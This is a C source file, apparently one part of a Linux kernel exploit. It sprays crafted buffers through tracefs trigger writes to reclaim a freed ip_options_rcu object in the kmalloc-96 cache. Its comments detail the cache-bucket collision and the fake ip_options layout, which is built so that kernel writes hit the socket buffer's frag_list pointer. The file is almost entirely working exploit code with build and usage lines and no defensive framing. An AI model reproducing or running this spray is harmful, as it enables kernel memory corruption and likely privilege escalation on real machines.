/* trgspray.c - reclaim the freed ip_options_rcu via tracefs event_trigger_write.
 *
 * event_trigger_write -> event_trigger_regex_write (kernel/trace/trace_events_trigger.c):
 *     buf = memdup_user_nul(ubuf, cnt);    // alloc = cnt+1, arbitrary bytes + NUL
 *     strim(buf);
 *     ret = trigger_process_regex(...);    // garbage -> parse error
 *     kfree(buf);                         // freed immediately -> fast churn
 *
 * The memdup_user_nul call site (event_trigger_write+0x3a) shares the
 * RANDOM_KMALLOC_CACHES bucket with tcp_v4_save_options on some boots
 * (bucket = hash_64(call_site ^ random_kmalloc_seed, 4) >> 60); check it per
 * boot with the seed kprobe before using this spray.
 *
 * No printable/NUL constraints: the fake ip_options can use ANY bytes.
 * This payload stages the frag_list call (same layout as avnspray.c):
 *   optlen=40 srr=67 rr=68 ts=69 flags=0x28, faddr=32.32.32.32,
 *   __data = valid printable TS option (passes RX ip_options_compile),
 *   client ISN 0x6D507163 so the SYN-ACK ACK bytes are 109/113/100 ->
 *   the three ip_options_build writes land at iph+172/+176/+160 =
 *   shinfo+8 (frag_list low), shinfo+12 (frag_list high), tailroom.
 *
 * Build: gcc -O2 -static -pthread -o trgspray trgspray.c
 * Usage: sudo ./trgspray <runtime_s> [cpu] [trigger_file]
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

#define TRIGGER "/sys/kernel/debug/tracing/events/sched/sched_switch/trigger"
#define CNT 79   /* alloc = 80 bytes -> kmalloc-96 */

int main(int argc, char **argv) {
    int runtime = argc > 1 ? atoi(argv[1]) : 30;
    int cpu = argc > 2 ? atoi(argv[2]) : 0;
    const char *trig = argc > 3 ? argv[3] : TRIGGER;
    cpu_set_t s;
    CPU_ZERO(&s);
    CPU_SET(cpu, &s);
    sched_setaffinity(0, sizeof(s), &s);

    /* fake ip_options_rcu = buf[16..75]; ip_options at object+16 */
    unsigned char buf[CNT];
    memset(buf, 0x41, sizeof(buf));
    buf[12] = 32; buf[13] = 32; buf[14] = 32; buf[15] = 32;  /* faddr 32.32.32.32 */
    buf[20] = 40;    /* optlen */
    buf[21] = 67;    /* srr  (write at iph+67+iph[68]-4) */
    buf[22] = 68;    /* rr   (write at iph+68+iph[70]-5) */
    buf[23] = 69;    /* ts   (write at iph+69+iph[71]-9) */
    buf[24] = 0x28;  /* flags: rr_needaddr | ts_needaddr */
    /* __data = valid printable TIMESTAMP option (type 0x44 len 0x28 ptr 0x25 flags 0x20) */
    buf[28] = 0x44;
    buf[29] = 0x28;
    buf[30] = 0x25;
    buf[31] = 0x20;
    /* markers: s1 = object[39..42] = buf[35..38], s3 = object[47..50] = buf[43..46] */
    buf[35] = 0x41; buf[36] = 0x42; buf[37] = 0x43; buf[38] = 0x44;
    buf[43] = 0x45; buf[44] = 0x46; buf[45] = 0x47; buf[46] = 0x48;

    int fd = open(trig, O_WRONLY);
    if (fd < 0) { perror(trig); return 1; }

    unsigned long n = 0, err = 0;
    time_t t0 = time(NULL);
    while ((int)(time(NULL) - t0) < runtime) {
        for (int i = 0; i < 512; i++) {
            ssize_t r = write(fd, buf, sizeof(buf));
            if (r < 0) err++; else n++;
        }
    }
    close(fd);
    fprintf(stderr, "[trg] writes=%lu err=%lu\n", n, err);
    return 0;
}
